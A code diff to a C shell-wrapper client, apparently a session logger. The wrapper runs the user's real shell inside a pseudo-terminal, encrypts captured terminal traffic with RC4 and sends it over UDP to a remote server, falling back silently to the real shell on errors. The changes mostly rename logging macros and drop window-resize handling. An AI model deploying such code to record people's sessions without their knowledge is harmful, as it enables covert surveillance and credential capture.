@@ -17,23 +17,25 @@
 #include <time.h>
 #include <pty.h>
 
-#include "configuration.h"
+#include "config.h"
 #include "utils.h"
 #include "rc4.h"
 #include "sha1.h"
 
 
+#if CLIENT_DBG
+#define client_dbg(format, arg...) DBG_PRINT_FUNC(format, "CLIENT_DBG", ##arg)
+#else
+#define  client_dbg(x...)
+#endif
+
+#define client_err(format, arg...) DBG_PRINT_FUNC(format, "CLIENT_ERR", ##arg)
 
 /* signal handler */
 
-int got_sigwinch = 0;
-int got_sigchld = 0;
+static int got_sigchld = 0;
 
-void sighandler(int signum) {
-    if (signum == SIGWINCH) {
-	got_sigwinch = 1;
-	signal(signum, sighandler);
-    }
+static void sighandler(int signum) {
     if (signum == SIGCHLD) {
 	got_sigchld = 1;
     }
@@ -45,7 +47,7 @@ static int setup_terminal(int tty, struct termios *tm) {
 
     ret = tcgetattr(0, tm);
     if (ret) {
-	shellog_err("Failed to get terminal attributes: %d\n", errno);
+	client_err("Failed to get terminal attributes: %d\n", errno);
 	return -1;
     }
 
@@ -73,7 +75,7 @@ static void reset_terminal(struct termios *tm) {
 static int create_server_connection(Connection_Data_t *cd) {
 
     if ((cd->server_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
-	shellog_err("Failed to open socket: %d\n", errno);
+	client_err("Failed to open socket: %d\n", errno);
 	return -1;
     }
 
@@ -98,7 +100,7 @@ static int create_real_shell_run_cmd(int argc, char *argv[],
 	last_slash++;
     }
 
-    shellog_dbg("CMD: %s\n", last_slash);
+    client_dbg("CMD: %s\n", last_slash);
 
     if (n > cmd_str_max_length - cmd_str_index)
 	goto not_enough_buffer_length;
@@ -125,7 +127,7 @@ static int create_real_shell_run_cmd(int argc, char *argv[],
 
     return 0;
 not_enough_buffer_length:
-    shellog_err("Not enough buffer length for real shell command [need: %d, available: %d]\n",
+    client_err("Not enough buffer length for real shell command [need: %d, available: %d]\n",
 	    n, cmd_str_max_length - cmd_str_index);
     return -1;
 }
@@ -229,13 +231,12 @@ static int encrypt_and_send(Connection_Data_t *cd, Session_Data_t * sd) {
 int main(int argc, char *argv[]) {
 
     char real_shell[256], *slave;
-    int i = 0, pty = 0, tty = 0;
+    int pty = 0, tty = 0;
     int ret = 0;
     Session_Data_t sd;
     Connection_Data_t cd;
     fd_set rd;
     struct termios tm; /* stored initial terminal settings */
-    struct winsize ws; /* current window size  */
     struct timeval tv;
 
     cd.server_fd = pty = tty = -1;
@@ -244,54 +245,48 @@ int main(int argc, char *argv[]) {
 
     ret = create_real_shell_run_cmd(argc, argv, real_shell, SZARR(real_shell));
     if (ret) {
-	shellog_err("Create real shell command failed\n");
+	client_err("Create real shell command failed\n");
 	goto exec_real_shell;
     }
 
-    shellog_dbg("Start as : %s\n", real_shell);
+    client_dbg("Start as : %s\n", real_shell);
 
     if (isatty(0) == 0 ||
 	    isatty(1) == 0 ||
 	    isatty(2) == 0 ||
 	    getlogin() == NULL) {
 
-	shellog_err("Skipping non interactive shell session\n");
+	client_err("Skipping non interactive shell session\n");
 	goto exec_real_shell;
     }
 
     ret = create_server_connection(&cd);
     if (ret) {
-	shellog_err("Create server connection failed\n");
+	client_err("Create server connection failed\n");
 	goto exec_real_shell;
     }
 
     /* create a pseudo-terminal */
 
     if (openpty(&pty, &tty, NULL, NULL, NULL) < 0) {
-	shellog_err("Open pseudo terminal failed: %d\n", errno);
+	client_err("Open pseudo terminal failed: %d\n", errno);
 	goto exec_real_shell;
     }
 
     if ((slave = ttyname(tty)) == NULL) {
-	shellog_err("Get TTY name failed: %d\n", errno);
+	client_err("Get TTY name failed: %d\n", errno);
 	goto exec_real_shell;
     }
-    shellog_dbg("Slave device is %s\n", slave);
+    client_dbg("Slave device is %s\n", slave);
 
     ret = setup_terminal(tty, &tm);
     if (ret) {
-	shellog_err("Setup terminal failed\n");
+	client_err("Setup terminal failed\n");
 	goto exec_real_shell;
     }
 
-    /* setup the window size */
+    /* handle child exit */
 
-    ioctl(0, TIOCGWINSZ, &ws);
-    ioctl(pty, TIOCSWINSZ, &ws);
-
-    /* handle window resizing and child exit */
-
-    signal(SIGWINCH, sighandler);
     signal(SIGCHLD, sighandler);
 
     /* fork to exec the original shell */
@@ -299,7 +294,7 @@ int main(int argc, char *argv[]) {
     switch ((sd.pid = fork())) {
 	case(-1):
 	    reset_terminal(&tm);
-	    shellog_err("Fork process failed: %d\n", errno);
+	    client_err("Fork process failed: %d\n", errno);
 	    goto exec_real_shell;
 	    break;
 	case(0):
@@ -401,10 +396,11 @@ int main(int argc, char *argv[]) {
 			break;
 		    }
 
+#if LOG_OUTPUT 
 		    sd.dir = 1;
 		    sd.len = n;
 		    encrypt_and_send(&cd, &sd);
-
+#endif
 		    if ((n = write(1, sd.buffer, n)) != n) {
 			if (n < 0 && (errno == EINTR || errno == EAGAIN))
 			    goto check_sigs;
@@ -417,16 +413,6 @@ check_sigs:
 		if (got_sigchld == 1) {
 		    got_sigchld = 0;
 		    break;
-		}
-
-		if (got_sigwinch == 1) {
-
-		    /* setup the new window size */
-
-		    got_sigwinch = 0;
-		    ioctl(0, TIOCGWINSZ, &ws);
-		    ioctl(pty, TIOCSWINSZ, &ws);
-		    kill(sd.pid, SIGWINCH);
 		}
 
 	    }
